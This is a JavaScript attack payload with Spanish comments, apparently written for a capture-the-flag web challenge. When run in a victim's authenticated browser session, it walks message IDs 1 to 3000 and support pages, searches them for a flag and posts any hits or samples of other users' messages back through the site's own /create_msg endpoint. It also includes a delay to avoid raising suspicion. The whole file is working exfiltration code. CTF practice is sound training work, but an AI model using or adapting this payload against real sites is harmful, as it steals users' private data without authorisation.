// navaja_enum.js — enumera /messages?id=... y exfiltra vía /create_msg (same-origin)
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const postMsg = async (message) => {
    try {
      await fetch('/create_msg', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })
      });
    } catch (_) {}
  };

  try {
    // 0) también mira lo que ve esta vista por si acaso
    try {
      const r0 = await fetch('/messages', { credentials: 'include' });
      const j0 = await r0.json();
      if (j0 && j0.messages && j0.messages.length) {
        const txt0 = JSON.stringify(j0);
        const m0 = txt0.match(/FLAG\{[^}]+\}/i);
        if (m0) { await postMsg(`EXFIL_FLAG(self): ${m0[0]}`); return; }
        await postMsg(`EXFIL_SELF: ${txt0.slice(0, 900)}`);
      } else {
        await postMsg(`EXFIL_SELF: {"messages":[]}`);
      }
    } catch (_) {}

    // 1) Enumera IDs
    const START = 1;           // ajusta si sospechas un rango distinto
    const END   = 3000;        // sube/baja según el CTF
    const STEP_DELAY = 120;    // ms entre intentos para no levantar sospechas

    for (let id = START; id <= END; id++) {
      const url = `/messages?id=${encodeURIComponent(id)}`;
      let data;
      try {
        const r = await fetch(url, { credentials: 'include' });
        if (!r.ok) continue;
        data = await r.json();
      } catch (_) { continue; }

      if (!data || !Array.isArray(data.messages)) { continue; }

      const arr = data.messages;
      if (arr.length === 0) { await sleep(STEP_DELAY); continue; }

      // 2) Buscar FLAG en ese hilo
      const txt = JSON.stringify({ id, messages: arr });
      const m = txt.match(/FLAG\{[^}]+\}/i);
      if (m) {
        await postMsg(`EXFIL_FLAG(id=${id}): ${m[0]}`);
        return; // objetivo cumplido
      }

      // 3) No hay flag: exfiltra muestra de ese hilo
      await postMsg(`EXFIL_HIT id=${id} count=${arr.length}: ${txt.slice(0, 850)}`);
      await sleep(STEP_DELAY);

      // 4) (opcional) intentar HTML de /support?id=... por si la flag está en el DOM
      try {
        const h = await fetch(`/support?id=${encodeURIComponent(id)}`, { credentials: 'include' });
        const t = await h.text();
        const m2 = t.match(/FLAG\{[^}]+\}/i);
        if (m2) {
          await postMsg(`EXFIL_FLAG_DOM(id=${id}): ${m2[0]}`);
          return;
        }
      } catch (_) {}
    }

    await postMsg('EXFIL_DONE: scanned range without FLAG');
  } catch (e) {
    await postMsg(`EXFIL_ERR: ${e && e.message ? e.message : String(e)}`);
  }
})();

